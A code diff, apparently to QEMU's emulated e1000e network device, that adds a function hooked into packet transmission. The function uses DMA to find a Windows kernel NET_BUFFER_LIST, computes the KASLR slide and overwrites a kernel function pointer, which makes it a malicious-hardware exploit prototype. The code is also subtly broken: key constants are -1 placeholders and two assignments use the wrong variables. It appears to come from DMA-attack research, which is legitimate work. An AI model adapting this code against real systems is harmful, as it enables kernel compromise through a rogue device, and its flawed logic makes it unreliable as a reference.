@@ -61,6 +61,7 @@
  * ---------------------------------------------------------------------------
  */
 
+void attempt_to_subvert_windows(E1000ECore* core, hwaddr ba);
 void attempt_to_subvert_mbuf(E1000ECore* core, hwaddr ba);
 void print_rx_buffer_address_information(E1000ECore *core);
 void print_tx_buffer_address_information(E1000ECore *core);
@@ -1002,7 +1003,9 @@ start_xmit(E1000ECore *core, const E1000E_TxRing *txr)
         process_tx_desc(core, txr->tx, &desc, txi->idx);
         cause |= txdesc_writeback(core, base, &desc, &ide, txi->idx);
 
-		attempt_to_subvert_mbuf(core, le64_to_cpu(desc.buffer_addr));
+		uint64_t buffer_addr = le64_to_cpu(desc.buffer_addr);
+		/*attempt_to_subvert_mbuf(core, buffer_addr);*/
+		attempt_to_subvert_windows(core, buffer_addr);
 
         _e1000e_ring_advance(core, txi, 1);
     }
@@ -3783,6 +3786,61 @@ attempt_to_subvert_mbuf(E1000ECore* core, hwaddr ba)
 	pci_dma_write(core->owner, ba & ~0xFF, buffer, 256);
 }
 
+void
+attempt_to_subvert_windows(E1000ECore* core, hwaddr ba)
+{
+	/* Emprically detirmined by atm26:
+	 * - NET_BUFFER_LIST at ffffb08618300030
+	 * - function pointer at +0x50
+	 * - signature of 0x422005b4 at +0xa0
+	 * - NET_BUFFER at ffffb086183001a0
+	 * - MDL at ffffb08618300270 (54 byte payload buffer with Ethernet headers)
+	 * - MDL at ffffb08615c032f0 (64240 byte payload buffer of Jumbo frame)
+	 * 0xffffb08618300030
+	 * 0xffffb08618300270
+	 */
+	static const hwaddr NET_BUFFER_LIST_OFFSET =
+		0xffffb08618300270LL - 0xffffb08618300030LL;
+	static const hwaddr SIGNATURE_OFFSET = 0xa0;
+	static const uint64_t EXPECTED_SIGNATURE = 0x422005b4;
+	static const uint64_t FP_OFFSET = 0x50;
+	static const uint64_t EXPECTED_SEND_FP = -1;
+	static const uint64_t WINDOWS_PAGE_MASK = (1LL << 13) - 1;
+	static const uint64_t NEW_FP_BASE = -1;
+
+	hwaddr net_buffer_list_addr = ba - NET_BUFFER_LIST_OFFSET;
+	hwaddr signature_addr = net_buffer_list_addr + SIGNATURE_OFFSET;
+
+	uint64_t signature;
+	pci_dma_read(core->owner, signature_addr, &signature, 8);
+	signature = le64_to_cpu(signature);
+
+	if (signature != EXPECTED_SIGNATURE) {
+		printf("Signature was: 0x%lx, but expected 0x%lx. Ignoring buffer.\n",
+			signature, EXPECTED_SIGNATURE);
+		return;
+	}
+
+	hwaddr fp_addr = net_buffer_list_addr + FP_OFFSET;
+	hwaddr kaslr_slide;
+
+	uint64_t fp;
+	pci_dma_read(core->owner, fp_addr, &fp, 8);
+	fp = le64_to_cpu(signature);
+
+	if ((fp & WINDOWS_PAGE_MASK) != (EXPECTED_SEND_FP & WINDOWS_PAGE_MASK)) {
+		printf("FP 0x%lx has different page offset from 0x%lx. "
+			"Ignoring buffer.\n",
+			fp, EXPECTED_SEND_FP);
+		return;
+	}
+
+	kaslr_slide = fp - EXPECTED_SEND_FP;
+	uint64_t new_fp = NEW_FP_BASE + kaslr_slide;
+	new_fp = cpu_to_le64(fp);
+
+	pci_dma_write(core->owner, fp_addr, &new_fp, 8);
+}
 
 void
 for_each_buffer_address(E1000ECore *core, const E1000E_RingInfo *rxi,
